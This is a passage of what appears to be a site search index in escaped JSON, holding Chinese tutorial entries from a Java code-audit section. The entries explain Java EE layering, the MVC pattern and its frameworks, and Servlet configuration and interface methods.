\u6d88\u606f\u670d\u52a1\uff08Java Message Service\uff0cJMS\uff09\u662f\u4e00\u4e2a Java \u5e73\u53f0\u4e2d\u5173\u4e8e\u9762\u5411\u6d88\u606f\u4e2d\u95f4\u4ef6\uff08MOM\uff09\u7684 API\uff0c\u7528\u4e8e\u5728\u4e24\u4e2a\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u6216\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u53d1\u9001\u6d88\u606f\uff0c\u8fdb\u884c\u5f02\u6b65\u901a\u4fe1\u3002</li> <li>JSP\uff08JavaServer Pages\uff09\u662f\u7531 Sun \u516c\u53f8\u4e3b\u5bfc\u5e76\u521b\u5efa\u7684\u4e00\u79cd\u52a8\u6001\u7f51\u9875\u6280\u672f\u6807\u51c6\u3002JSP \u90e8\u7f72\u4e8e\u7f51\u7edc\u670d\u52a1\u5668\u4e0a\uff0c\u53ef\u4ee5\u54cd\u5e94\u5ba2\u6237\u7aef\u53d1\u9001\u7684\u8bf7\u6c42\uff0c\u5e76\u6839\u636e\u8bf7\u6c42\u5185\u5bb9\u52a8\u6001\u751f\u6210HTML\u3001XML \u6216\u5176\u4ed6\u683c\u5f0f\u6587\u6863\u7684 Web \u7f51\u9875\uff0c\u7136\u540e\u8fd4\u56de\u7ed9\u8bf7\u6c42\u8005\u3002</li> </ul>"},{"location":"Code_audit/Java/Java-2/Java2.html#java-ee_2","title":"Java EE \u5206\u5c42\u6a21\u578b","text":"<p>Java EE \u5e94\u7528\u7684\u5206\u5c42\u6a21\u578b\u4e3b\u8981\u5206\u4e3a\u4ee5\u4e0b 5 \u5c42\u3002</p> <ul> <li>Domain Object\uff08\u9886\u57df\u5bf9\u8c61\uff09\u5c42\uff1a\u672c\u5c42\u7531\u4e00\u7cfb\u5217 POJO\uff08Plain Old Java Object\uff0c\u666e\u901a\u7684\u3001\u4f20\u7edf\u7684 Java \u5bf9\u8c61\uff09\u7ec4\u6210\uff0c\u8fd9\u4e9b\u5bf9\u8c61\u662f\u8be5\u7cfb\u7edf\u7684 Domain Object\uff0c\u901a\u5e38\u5305\u542b\u5404\u81ea\u6240\u9700\u5b9e\u73b0\u7684\u4e1a\u52a1\u903b\u8f91\u65b9\u6cd5\u3002</li> <li>DAO\uff08Data Access Object\uff0c\u6570\u636e\u8bbf\u95ee\u5bf9\u8c61\uff09\u5c42\uff1a\u672c\u5c42\u7531\u4e00\u7cfb\u5217 DAO \u7ec4\u4ef6\u7ec4\u6210\uff0c\u8fd9\u4e9b DAO \u5b9e\u73b0\u4e86\u5bf9\u6570\u636e\u5e93\u7684\u521b\u5efa\u3001\u67e5\u8be2\u3001\u66f4\u65b0\u548c\u5220\u9664\u7b49\u64cd\u4f5c\u3002</li> <li>Service\uff08\u4e1a\u52a1\u903b\u8f91\uff09\u5c42\uff1a\u672c\u5c42\u7531\u4e00\u7cfb\u5217\u7684\u4e1a\u52a1\u903b\u8f91\u5bf9\u8c61\u7ec4\u6210\uff0c\u8fd9\u4e9b\u4e1a\u52a1\u903b\u8f91\u5bf9\u8c61\u5b9e\u73b0\u4e86\u7cfb\u7edf\u6240\u9700\u8981\u7684\u4e1a\u52a1\u903b\u8f91\u65b9\u6cd5\u3002</li> <li>Controller\uff08\u63a7\u5236\u5668\uff09\u5c42\uff1a\u672c\u5c42\u7531\u4e00\u7cfb\u5217\u63a7\u5236\u5668\u7ec4\u6210\uff0c\u8fd9\u4e9b\u63a7\u5236\u5668\u7528\u4e8e\u62e6\u622a\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u5e76\u8c03\u7528\u4e1a\u52a1\u903b\u8f91\u7ec4\u4ef6\u7684\u4e1a\u52a1\u903b\u8f91\u65b9\u6cd5\u53bb\u5904\u7406\u7528\u6237\u8bf7\u6c42\uff0c\u7136\u540e\u6839\u636e\u5904\u7406\u7ed3\u679c\u5411\u4e0d\u540c\u7684 View \u7ec4\u4ef6\u8f6c\u53d1\u3002</li> <li>View\uff08\u8868\u73b0\uff09\u5c42\uff1a\u672c\u5c42\u7531\u4e00\u7cfb\u5217\u7684\u9875\u9762\u53ca\u89c6\u56fe\u7ec4\u4ef6\u7ec4\u6210\uff0c\u8d1f\u8d23\u6536\u96c6\u7528\u6237\u8bf7\u6c42\uff0c\u5e76\u663e\u793a\u5904\u7406\u540e\u7684\u7ed3\u679c</li> </ul> <p>\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u9996\u5148\u7531\u6570\u636e\u5e93\u7ed9 Domain Object \u5c42\u63d0\u4f9b\u6301\u4e45\u5316\u670d\u52a1\uff0c\u7136\u540e\u7531Domain Object \u5c42\u53bb\u5c01\u88c5 DAO \u5c42\uff0cDAO \u5c42\u4e3a\u4e1a\u52a1\u903b\u8f91\u5c42\u63d0\u4f9b\u6570\u636e\u8bbf\u95ee\u670d\u52a1\uff0c\u63a5\u7740\u4e1a\u52a1\u903b\u8f91\u5c42\u4e3a\u63a7\u5236\u5668\u5c42\u63d0\u4f9b\u903b\u8f91\u652f\u6301\uff0c\u6700\u7ec8\u5728\u8868\u73b0\u5c42\u663e\u793a\u7ed3\u679c\u3002</p> <p></p> <p>Java EE \u5206\u5c42\u6a21\u578b\u7684\u5e94\u7528\uff0c\u4f7f\u5f97\u9879\u76ee\u6613\u4e8e\u7ef4\u62a4\uff0c\u7ba1\u7406\u7b80\u5316\uff0c\u5e76\u4e14\u9002\u5e94\u5927\u89c4\u6a21\u548c\u590d\u6742\u7684\u5e94\u7528\u9700\u6c42\u4ee5\u53ca\u4e0d\u65ad\u53d8\u5316\u7684\u4e1a\u52a1\u9700\u6c42\u3002\u6b64\u5916\uff0c\u5206\u5c42\u6a21\u578b\u8fd8\u80fd\u6709\u6548\u63d0\u9ad8\u7cfb\u7edf\u5e76\u53d1\u5904\u7406\u80fd\u529b\u3002</p>"},{"location":"Code_audit/Java/Java-2/Java2.html#mvc-mvc","title":"MVC \u6a21\u5f0f\u4e0e MVC \u6846\u67b6","text":"<p>\u5728\u5bf9\u67d0\u4e00\u9879\u76ee\u8fdb\u884c\u4ee3\u7801\u5ba1\u8ba1\u65f6\uff0c\u6211\u4eec\u9700\u8981\u4ece\u5176\u8f93\u5165\u3001\u5904\u7406\u548c\u8f93\u51fa\u6765\u5ba1\u8ba1\u6f0f\u6d1e\uff0c\u9075\u5faa MVC\uff08Model View Controller\uff09\u601d\u60f3\u3002\u5728 MVC \u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u6709 3 \u4e2a\u4e3b\u8981\u7684\u6838\u5fc3\u90e8\u4ef6\uff0c\u5206\u522b\u662f\u6a21\u578b\u3001\u89c6\u56fe\u3001\u63a7\u5236\u5668\uff0c\u5b83\u4eec\u72ec\u7acb\u5904\u7406\u5404\u81ea\u7684\u4efb\u52a1\uff0c\u8fd9\u79cd\u5206\u79bb\u7684\u601d\u60f3\u4f7f\u5f97\u6211\u4eec\u5728\u5ba1\u8ba1\u65f6\u80fd\u591f\u6293\u4f4f\u5173\u952e\u95ee\u9898\uff0c\u800c\u4e0d\u7528\u5173\u5fc3\u7c7b\u4f3c\u4e8e\u754c\u9762\u663e\u793a\u7b49\u65e0\u5173\u7d27\u8981\u7684\u95ee\u9898\u3002</p>"},{"location":"Code_audit/Java/Java-2/Java2.html#java-mvc","title":"Java MVC \u6a21\u5f0f","text":""},{"location":"Code_audit/Java/Java-2/Java2.html#mvc","title":"MVC \u7684\u6982\u5ff5","text":"<p>MVC \u5168\u540d\u662f Model View Controller\uff0cM\uff08Model\uff09\u662f\u6307\u6570\u636e\u6a21\u578b\uff0cV\uff08View\uff09\u662f\u6307\u7528\u6237\u754c\u9762\uff0cC\uff08Controller\uff09\u662f\u63a7\u5236\u5668\u3002\u4f7f\u7528 MVC \u6700\u76f4\u63a5\u7684\u76ee\u7684\u5c31\u662f\u5c06M\u548cV\u5b9e\u73b0\u4ee3\u7801\u5206\u79bb\uff0cC \u5219\u662f\u786e\u4fdd M \u548cV \u7684\u540c\u6b65\uff0c\u4e00\u65e6 M \u6539\u53d8\uff0cV \u5c31\u5e94\u8be5\u540c\u6b65\u66f4\u65b0\u3002\u7b80\u5355\u6765\u8bf4\uff0cMVC \u662f\u4e00\u4e2a\u8bbe\u8ba1\u6a21\u5f0f\uff0c\u5b83\u5f3a\u5236\u6027\u5730\u4f7f\u5e94\u7528\u7a0b\u5e8f\u7684\u8f93\u5165\u3001\u5904\u7406\u548c\u8f93\u51fa\u5206\u5f00\u3002MVC \u5e94\u7528\u7a0b\u5e8f\u88ab\u5206\u6210 3 \u4e2a\u6838\u5fc3\u90e8\u4ef6\uff1aModel\u3001View\u3001Controller\u3002\u5b83\u4eec\u72ec\u7acb\u5904\u7406\u5404\u81ea\u7684\u4efb\u52a1\u3002</p> <p>Java MVC \u6a21\u5f0f\u4e0e\u666e\u901a MVC \u7684\u533a\u522b\u4e0d\u5927\uff0c\u5177\u4f53\u5982\u4e0b\u3002</p> <ul> <li>\u6a21\u578b\uff08Model\uff09\uff1a\u8868\u793a\u643a\u5e26\u6570\u636e\u7684\u5bf9\u8c61\u6216 Java POJO\u3002\u5373\u4f7f\u6a21\u578b\u5185\u7684\u6570\u636e\u6539\u53d8\uff0c\u5b83\u4e5f\u5177\u6709\u903b\u8f91\u6765\u66f4\u65b0\u63a7\u5236\u5668\u3002</li> <li>\u63a7\u5236\u5668\uff08Controller\uff09\uff1a\u8868\u793a\u903b\u8f91\u63a7\u5236\uff0c\u63a7\u5236\u5668\u5bf9\u6a21\u578b\u548c\u89c6\u56fe\u90fd\u6709\u4f5c\u7528\uff0c\u63a7\u5236\u6570\u636e\u6d41\u8fdb\u5165\u6a21\u578b\u5bf9\u8c61\uff0c\u5e76\u5728\u6570\u636e\u66f4\u6539\u65f6\u66f4\u65b0\u89c6\u56fe\uff0c\u662f\u89c6\u56fe\u548c\u6a21\u578b\u7684\u4e2d\u95f4\u5c42\u3002</li> <li>\u89c6\u56fe\uff08View\uff09\uff1a\u8868\u793a\u6a21\u578b\u5305\u542b\u7684\u6570\u636e\u7684\u53ef\u89c6\u5316\u5c42\u3002</li> </ul>"},{"location":"Code_audit/Java/Java-2/Java2.html#mvc_1","title":"MVC \u5de5\u4f5c\u6d41\u7a0b","text":"<p>MVC \u7684\u5de5\u4f5c\u6d41\u7a0b\u4e5f\u5f88\u5bb9\u6613\u7406\u89e3\u3002\u9996\u5148\uff0cController \u5c42\u63a5\u6536\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u5e76\u51b3\u5b9a\u5e94\u8be5\u8c03\u7528\u54ea\u4e2a Model \u6765\u8fdb\u884c\u5904\u7406\uff1b\u7136\u540e\uff0c\u7531 Model \u4f7f\u7528\u903b\u8f91\u5904\u7406\u7528\u6237\u7684\u8bf7\u6c42\u5e76\u8fd4\u56de\u6570S\u636e\uff1b\u6700\u540e\uff0c\u8fd4\u56de\u7684\u6570\u636e\u901a\u8fc7 View \u5c42\u5448\u73b0\u7ed9\u7528\u6237\u3002</p> <p></p> <p>MVC \u6a21\u5f0f\u4f7f\u89c6\u56fe\u5c42\u548c\u4e1a\u52a1\u5c42\u5206\u79bb\uff0c\u4ee5\u4fbf\u66f4\u6539 View \u5c42\u4ee3\u7801\u65f6\uff0c\u4e0d\u7528\u91cd\u65b0\u7f16\u8bd1Model \u548c Controller \u4ee3\u7801\u3002\u540c\u6837\uff0c\u5f53\u67d0\u4e2a\u5e94\u7528\u7684\u4e1a\u52a1\u6d41\u7a0b\u6216\u8005\u4e1a\u52a1\u89c4\u5219\u53d1\u751f\u6539\u53d8\u65f6\uff0c\u53ea\u9700\u8981\u6539\u52a8 Model \u5c42\u5373\u53ef\u5b9e\u73b0\u9700\u6c42\u3002</p>"},{"location":"Code_audit/Java/Java-2/Java2.html#java-mvc_1","title":"Java MVC \u6846\u67b6","text":"<p>Java MVC \u7684\u6846\u67b6\u6709\u5f88\u591a\uff0c\u5982\u6bd4\u8f83\u7ecf\u5178\u7684 Struts1 \u6846\u67b6\u3001Struts2 \u6846\u67b6\u3001Spring MVC\u6846\u67b6\uff0c\u6b64\u5916\u8fd8\u6709\u5c0f\u4f17\u7684 JSF \u6846\u67b6\u4ee5\u53ca Tapestry \u6846\u67b6\u3002\u4e0b\u9762\u7b80\u5355\u4ecb\u7ecd\u8fd9\u4e9b\u6846\u67b6\u3002</p> <ul> <li>Struts1 \u6846\u67b6\uff1aStruts \u662f\u8f83\u65e9\u7684 Java \u5f00\u6e90\u6846\u67b6\u4e4b\u4e00\uff0c\u5b83\u662f MVC \u8bbe\u8ba1\u6a21\u5f0f\u7684\u4e00\u4e2a\u4f18\u79c0\u5b9e\u73b0\u3002Struts1 \u6846\u67b6\u57fa\u4e8e MVC \u6a21\u5f0f\u5b9a\u4e49\u4e86\u901a\u7528\u7684 Controller\uff0c\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u5206\u79bb\u4e86Model \u548c View\uff0c\u901a\u8fc7 Action \u5bf9\u7528\u6237\u8bf7\u6c42\u8fdb\u884c\u4e86\u5c01\u88c5\uff0c\u4f7f\u4ee3\u7801\u66f4\u52a0\u6e05\u6670\u3001\u6613\u8bfb\uff0c\u6574\u4e2a\u9879\u76ee\u4e5f\u66f4\u6613\u7ba1\u7406\u3002</li> <li>Struts2 \u6846\u67b6\uff1aStruts2 \u6846\u67b6\u5e76\u4e0d\u662f\u5355\u7eaf\u7531 Struts1 \u7248\u672c\u5347\u7ea7\u800c\u6765\uff0c\u800c\u662f Apache \u6839\u636e\u4e00\u4e2a\u540d\u4e3a WebWork \u7684\u9879\u76ee\u53d1\u5c55\u800c\u6765\u7684\uff0c\u6240\u4ee5\u4e24\u8005\u7684\u5173\u7cfb\u5e76\u4e0d\u5927\u3002Struts2 \u6846\u67b6\u540c\u6837\u662f\u4e00\u4e2a\u57fa\u4e8e MVC \u8bbe\u8ba1\u6a21\u5f0f\u7684 Web \u5e94\u7528\u6846\u67b6\uff0c\u5b83\u672c\u8d28\u4e0a\u76f8\u5f53\u4e8e\u4e00\u4e2a Servlet\u3002\u5728MVC \u8bbe\u8ba1\u6a21\u5f0f\u4e2d\uff0cStruts2 \u4f5c\u4e3a\u63a7\u5236\u5668\u6765\u5efa\u7acb\u6a21\u578b\u4e0e\u89c6\u56fe\u7684\u6570\u636e\u4ea4\u4e92\u3002</li> <li>Spring MVC \u6846\u67b6\uff1aSpring MVC \u662f\u4e00\u4e2a\u57fa\u4e8e MVC \u601d\u60f3\u7684\u4f18\u79c0\u5e94\u7528\u6846\u67b6,\u5b83\u662fSpring \u7684\u4e00\u4e2a\u5b50\u6846\u67b6\uff0c\u4e5f\u662f\u4e00\u4e2a\u975e\u5e38\u4f18\u79c0\u7684 MVC \u6846\u67b6\u3002Spring MVC \u89d2\u8272\u5212\u5206\u6e05\u6670\uff0c\u5206\u5de5\u660e\u7ec6\uff0c\u5e76\u4e14\u4e0e Spring \u6846\u67b6\u65e0\u7f1d\u7ed3\u5408\u3002\u4f5c\u4e3a\u5f53\u4eca\u4e1a\u754c\u6700\u4e3b\u6d41\u7684 Web \u5f00\u53d1\u6846\u67b6\uff0cSpring MVC \u6846\u67b6\u5df2\u7ecf\u6210\u4e3a\u5f53\u524d\u6700\u70ed\u95e8\u7684\u5f00\u53d1\u6280\u80fd\u4e4b\u4e00\uff0c\u540c\u65f6\u4e5f\u5e7f\u6cdb\u7528\u4e8e\u684c\u9762\u5f00\u53d1\u9886\u57df\u3002</li> <li>JSF \u6846\u67b6\uff1aJSF \u6846\u67b6\u662f\u4e00\u4e2a\u7528\u4e8e\u6784\u5efa Java Web \u5e94\u7528\u7a0b\u5e8f\u7684\u6807\u51c6\u6846\u67b6\uff0c\u4e5f\u662f\u4e00\u4e2aMVC Web \u5e94\u7528\u6846\u67b6\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u4ee5\u7ec4\u4ef6\u4e3a\u4e2d\u5fc3\u7684\u7528\u6237\u754c\u9762\uff08UI\uff09\u6784\u5efa\u65b9\u6cd5\uff0c\u4ece\u800c\u7b80\u5316\u4e86 Java \u670d\u52a1\u5668\u7aef\u5e94\u7528\u7a0b\u5e8f\u7684\u5f00\u53d1\u3002</li> <li>Tapestry \u6846\u67b6\uff1aTapestry \u6846\u67b6\u4e5f\u662f\u4e00\u79cd\u57fa\u4e8e Java \u7684 Web \u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\uff0c\u4e0e\u4e0a\u8ff04 \u6b3e\u6846\u67b6\u76f8\u6bd4\uff0cTapestry \u5e76\u4e0d\u662f\u4e00\u79cd\u5355\u7eaf\u7684 MVC \u6846\u67b6\uff0c\u5b83\u66f4\u50cf MVC \u6846\u67b6\u548c\u6a21\u677f\u6280\u672f\u7684\u7ed3\u5408\uff0c\u4e0d\u4ec5\u5305\u542b\u524d\u7aef\u7684 MVC \u6846\u67b6\uff0c\u8fd8\u5305\u542b\u4e00\u79cd\u89c6\u56fe\u5c42\u7684\u6a21\u677f\u6280\u672f\uff0c\u5e76\u4f7f\u7528Tapestry \u5b8c\u5168\u4e0e Servlet/JSP API \u5206\u79bb\uff0c\u662f\u4e00\u79cd\u975e\u5e38\u4f18\u79c0\u7684\u8bbe\u8ba1\u3002\u76f8\u5bf9\u4e8e\u73b0\u6709\u7684\u5176\u4ed6Web \u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u800c\u8a00\uff0cTapestry \u6846\u67b6\u4f1a\u5e2e\u52a9\u5f00\u53d1\u8005\u4ece\u70e6\u7410\u7684\u3001\u4e0d\u5fc5\u8981\u7684\u5e95\u5c42\u4ee3\u7801\u4e2d\u89e3\u653e\u51fa\u6765.</li> </ul>"},{"location":"Code_audit/Java/Java-2/Java2.html#java-web-servlet","title":"Java Web \u7684\u6838\u5fc3\u6280\u672f\u2014\u2014Servlet","text":"<p>Servlet \u5176\u5b9e\u662f\u5728 Java Web \u5bb9\u5668\u4e2d\u8fd0\u884c\u7684\u5c0f\u7a0b\u5e8f\u3002\u7528\u6237\u901a\u5e38\u4f7f\u7528 Servlet \u6765\u5904\u7406\u4e00\u4e9b\u8f83\u4e3a\u590d\u6742\u7684\u670d\u52a1\u5668\u7aef\u7684\u4e1a\u52a1\u903b\u8f91\u3002Servlet \u539f\u5219\u4e0a\u53ef\u4ee5\u901a\u8fc7\u4efb\u4f55\u5ba2\u6237\u7aef-\u670d\u52a1\u5668\u534f\u8bae\u8fdb\u884c\u901a\u4fe1\uff0c\u4f46\u662f\u5b83\u4eec\u5e38\u4e0e HTTP \u4e00\u8d77\u4f7f\u7528\uff0c\u56e0\u6b64\uff0c\u201cServlet\u201d\u901a\u5e38\u7528\u4f5c\u201cHTTP servlet\u201d\u7684\u7b80\u5199\u3002Servlet \u662f Java EE \u7684\u6838\u5fc3\uff0c\u4e5f\u662f\u6240\u6709 MVC \u6846\u67b6\u5b9e\u73b0\u7684\u6839\u672c\u3002</p>"},{"location":"Code_audit/Java/Java-2/Java2.html#servlet","title":"Servlet \u7684\u914d\u7f6e","text":"<p>\u7248\u672c\u4e0d\u540c\uff0cServlet \u7684\u914d\u7f6e\u4e0d\u540c\u3002Servlet 3.0 \u4e4b\u524d\u7684\u7248\u672c\u90fd\u662f\u5728 web.xml \u4e2d\u914d\u7f6e\u7684\uff0c\u800c Servlet 3.0 \u4e4b\u540e\u7684\u7248\u672c\u5219\u4f7f\u7528\u66f4\u4e3a\u4fbf\u6377\u7684\u6ce8\u89e3\u65b9\u5f0f\u6765\u914d\u7f6e\u3002\u6b64\u5916\uff0c\u4e0d\u540c\u7248\u672c\u7684Servlet \u6240\u9700\u7684 Java/JDK \u7248\u672c\u4e5f\u4e0d\u76f8\u540c\u3002</p> <p>Servlet \u7248\u672c\u53ca\u5176\u5bf9\u5e94\u7684 Java \u7248\u672c\uff1a</p> <p></p> <p></p>"},{"location":"Code_audit/Java/Java-2/Java2.html#1webxml","title":"1.\u57fa\u4e8eweb.xml","text":"<p>\u4e0b\u56fe\u662f\u4e00\u4e2a\u57fa\u4e8eweb.xml\u7684Servelt\u914d\u7f6e</p> <p></p> <p>\u5728 web.xml \u4e2d\uff0cServlet \u7684\u914d\u7f6e\u5728 Servlet \u6807\u7b7e\u4e2d\uff0cServlet \u6807\u7b7e\u662f\u7531 Servlet \u548cServlet-mapping \u6807\u7b7e\u7ec4\u6210\uff0c\u4e24\u8005\u901a\u8fc7\u5728 Servlet \u548c Servlet-mapping \u6807\u7b7e\u4e2d\u76f8\u540c\u7684Servlet-name \u540d\u79f0\u5b9e\u73b0\u5173\u8054\uff0c\u4e0a\u56fe\u7684\u6807\u7b7e\u542b\u4e49\u5982\u4e0b\uff1a</p> <ul> <li>:\u58f0\u660eServlet\u914d\u7f6e\u5165\u53e3 <li>:\u58f0\u660eServlet\u63cf\u8ff0\u4fe1\u606f <li>:\u5b9a\u4e49Web\u5e94\u7528\u7684\u540d\u5b57 <li>:\u58f0\u660eServlet\u540d\u79f0\u4ee5\u4fbf\u5728\u540e\u9762\u7684\u6620\u5c04\u65f6\u4f7f\u7528 <li>:\u6307\u5b9a\u5f53\u524dServlet\u5bf9\u5e94\u7684\u7c7b\u7684\u8def\u5f84 <li>:\u6ce8\u518c\u7ec4\u4ef6\u8bbf\u95ee\u914d\u7f6e\u7684\u8def\u5f84\u5165\u53e3 <li>:\u6307\u5b9a\u914d\u7f6e\u8fd9\u4e2a\u7ec4\u4ef6\u7684\u8bbf\u95ee\u8def\u5f84"},{"location":"Code_audit/Java/Java-2/Java2.html#2","title":"2.\u57fa\u4e8e\u6ce8\u89e3\u65b9\u5f0f","text":"<p>Servlet 3.0 \u4ee5\u4e0a\u7684\u7248\u672c\u4e2d\uff0c\u5f00\u53d1\u8005\u65e0\u987b\u5728 web.xml \u91cc\u9762\u914d\u7f6e Servlet\uff0c\u53ea\u9700\u8981\u6dfb\u52a0@WebServlet \u6ce8\u89e3\u5373\u53ef\u4fee\u6539 Servlet \u7684\u5c5e\u6027\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u7b2c 13 \u884c@WebServlet \u7684\u6ce8\u89e3\u53c2\u6570\u6709 description \u53ca urlPatterns\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u5f88\u591a\u53c2\u6570\uff0c\u5177\u4f53\u5982\u4e0b\u8868\u6240\u793a\u3002</p> <p></p> <p>\u7531\u6b64\u53ef\u4ee5\u770b\u51fa\uff0cweb.xml \u53ef\u4ee5\u914d\u7f6e\u7684 Servlet \u5c5e\u6027\uff0c\u90fd\u53ef\u4ee5\u901a\u8fc7@WebServlet \u7684\u65b9\u5f0f\u8fdb\u884c\u914d\u7f6e\u3002</p>"},{"location":"Code_audit/Java/Java-2/Java2.html#servlet_1","title":"Servlet \u7684\u8bbf\u95ee\u6d41\u7a0b","text":"<p>\u4ee5\u4e0b\u9762\u8fd9\u5f20\u56fe\u4e3a\u4f8b\uff0c\u5176\u8bbf\u95ee\u6d41\u7a0b\u5982\u540e\u56fe\u6240\u793a\u3002</p> <p></p> <p>Servlet\u7684\u8bbf\u95ee\u6d41\u7a0b\uff1a</p> <p></p> <p>\u9996\u5148\u5728\u6d4f\u89c8\u5668\u5730\u5740\u680f\u4e2d\u8f93\u5165 user\uff0c\u5373\u8bbf\u95ee url-pattern \u6807\u7b7e\u4e2d\u7684\u503c\uff1b\u7136\u540e\u6d4f\u89c8\u5668\u53d1\u8d77\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u901a\u8fc7 servlet-mapping \u6807\u7b7e\u4e2d\u627e\u5230\u6587\u4ef6\u540d\u4e3a user \u7684 url-pattern\uff0c\u901a\u8fc7\u5176\u5bf9\u5e94\u7684 servlet-name \u5bfb\u627e servlet \u6807\u7b7e\u4e2d servlet-name \u76f8\u540c\u7684 servlet\uff1b\u518d\u901a\u8fc7 servlet \u6807\u7b7e\u4e2d\u7684 servlet-name\uff0c\u83b7\u53d6 servlet-class \u53c2\u6570\uff1b\u6700\u540e\u5f97\u5230\u5177\u4f53\u7684 class \u6587\u4ef6\u8def\u5f84\uff0c\u7ee7\u800c\u6267\u884c servlet-class \u6807\u7b7e\u4e2d class \u6587\u4ef6\u7684\u903b\u8f91\u3002 \u4ece\u4e0a\u8ff0\u8fc7\u7a0b\u53ef\u4ee5\u770b\u51fa\uff0cservlet \u548c servlet-mapping \u4e2d\u90fd\u542b\u6709 \u6807\u7b7e\uff0c\u5176\u4e3b\u8981\u539f\u56e0\u662f\u901a\u8fc7 servlet-name \u4f5c\u4e3a\u7ebd\u5e26\uff0c\u5c06 servlet-class \u548curl-pattern \u6784\u6210\u8054\u7cfb\uff0c\u4ece\u800c\u4f7f URL \u6620\u5c04\u5230 servlet-class \u6240\u6307\u5b9a\u7684\u7c7b\u4e2d\u6267\u884c\u76f8\u5e94\u903b\u8f91\u3002</p>"},{"location":"Code_audit/Java/Java-2/Java2.html#servlet_2","title":"Servlet \u7684\u63a5\u53e3\u65b9\u6cd5","text":"<p>HTTP \u6709 8 \u79cd\u8bf7\u6c42\u65b9\u6cd5\uff0c\u5206\u522b\u4e3a GET\u3001POST\u3001HEAD\u3001OPTIONS\u3001PUT\u3001DELETE\u3001TRACE \u4ee5\u53ca CONNECT \u65b9\u6cd5\u3002\u4e0e\u6b64\u7c7b\u4f3c\uff0cServlet \u63a5\u53e3\u4e2d\u4e5f\u5bf9\u5e94\u7740\u76f8\u5e94\u7684\u8bf7\u6c42\u63a5\u53e3\uff1aGET\u3001POST\u3001HEAD\u3001OPTIONS\u3001PUT\u3001DELETE \u4ee5\u53ca TRACE\uff0c\u8fd9\u4e9b\u63a5\u53e3\u5bf9\u5e94\u7740\u8bf7\u6c42\u7c7b\u578b\uff0cservice()\u65b9\u6cd5\u4f1a\u68c0\u67e5 HTTP \u8bf7\u6c42\u7c7b\u578b\uff0c\u7136\u540e\u5728\u9002\u5f53\u7684\u65f6\u5019\u8c03\u7528 doGet\u3001doPost\u3001doPut\uff0cdoDelete \u7b49\u65b9\u6cd5\u3002</p> <p>Servlet \u7684\u63a5\u53e3\u65b9\u6cd5\u5982\u4e0b\u3002</p>"},{"location":"Code_audit/Java/Java-2/Java2.html#1init","title":"1.init() \u63a5\u53e3","text":"<p>\u5728 Servlet \u5b9e\u4f8b\u5316\u540e\uff0cServlet \u5bb9\u5668\u4f1a\u8c03\u7528 init()\u65b9\u6cd5\u6765\u521d\u59cb\u5316\u8be5\u5bf9\u8c61\uff0c\u4e3b\u8981\u662f\u4f7fServlet \u5bf9\u8c61\u5728\u5904\u7406\u5ba2\u6237\u8bf7\u6c42\u524d\u53ef\u4ee5\u5b8c\u6210\u4e00\u4e9b\u521d\u59cb\u5316\u5de5\u4f5c\uff0c\u4f8b\u5982\u5efa\u7acb\u6570\u636e\u5e93\u7684\u8fde\u63a5\uff0c\u83b7\u53d6\u914d\u7f6e\u4fe1\u606f\u7b49\u3002init() \u65b9\u6cd5\u5728\u7b2c\u4e00\u6b21\u521b\u5efa Servlet \u65f6\u88ab\u8c03\u7528\uff0c\u5728\u540e\u7eed\u6bcf\u6b21\u7528\u6237\u8bf7\u6c42\u65f6\u4e0d\u518d\u88ab\u8c03\u7528\u3002init() \u65b9\u6cd5\u7684\u5b9a\u4e49\u5982\u4e0b\u3002</p> <pre><code>public void init() throws ServletException{ \n // \u6b64\u5904\u5185\u5bb9\u4e3a\u5f00\u53d1\u8005\u5b9a\u4e49\u7684\u521d\u59cb\u5316\u4ee3\u7801\n}\n</code></pre>"},{"location":"Code_audit/Java/Java-2/Java2.html#2service","title":"2.service() \u63a5\u53e3","text":"<p>service() \u65b9\u6cd5\u662f\u6267\u884c\u5b9e\u9645\u4efb\u52a1\u7684\u4e3b\u8981\u65b9\u6cd5\u3002Servlet \u5bb9\u5668\uff08Web \u670d\u52a1\u5668\uff09\u8c03\u7528service()\u65b9\u6cd5\u6765\u5904\u7406\u6765\u81ea\u5ba2\u6237\u7aef\uff08\u6d4f\u89c8\u5668\uff09\u7684\u8bf7\u6c42\uff0c\u5e76\u5c06\u683c\u5f0f\u5316\u7684\u54cd\u5e94\u5199\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u6bcf\u6b21\u670d\u52a1\u5668\u63a5\u6536\u5230\u4e00\u4e2a Servlet \u8bf7\u6c42\u65f6\uff0c\u670d\u52a1\u5668\u90fd\u4f1a\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684\u7ebf\u7a0b\u5e76\u8c03\u7528\u670d\u52a1\u3002\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 service()\u65b9\u6cd5\u88ab Servlet \u5bb9\u5668\u8c03\u7528\u4e4b\u524d\uff0c\u5fc5\u987b\u786e\u4fdd init()\u65b9\u6cd5\u6b63\u786e\u5b8c\u6210\u3002</p> <p>Service()\u65b9\u6cd5\u7684\u5b9a\u4e49\u5982\u4e0b\u3002</p> <pre><code>public void service(ServletRequest request, \n ServletResponse response) \n throws ServletException, IOException \n{ \n // \u6b64\u5904\u5185\u5bb9\u4e3a\u5f00\u53d1\u8005\u5904\u7406\u7528\u6237\u8bf7\u6c42\u7684\u4ee3\u7801\n}\n</code></pre>"},{"location":"Code_audit/Java/Java-2/Java2.html#3dogetdopost","title":"3.doGet()/doPost()\u7b49\u63a5\u53e3","text":"<p>doGet() \u7b49\u65b9\u6cd5\u6839\u636e HTTP \u7684\u4e0d\u540c\u8bf7\u6c42\u8c03\u7528\u4e0d\u540c\u7684\u65b9\u6cd5\u3002\u5982\u679c HTTP \u5f97\u5230\u4e00\u4e2a\u6765\u81ea URL \u7684 GET \u8bf7\u6c42\uff0c\u5c31\u4f1a\u8c03\u7528 doGet() 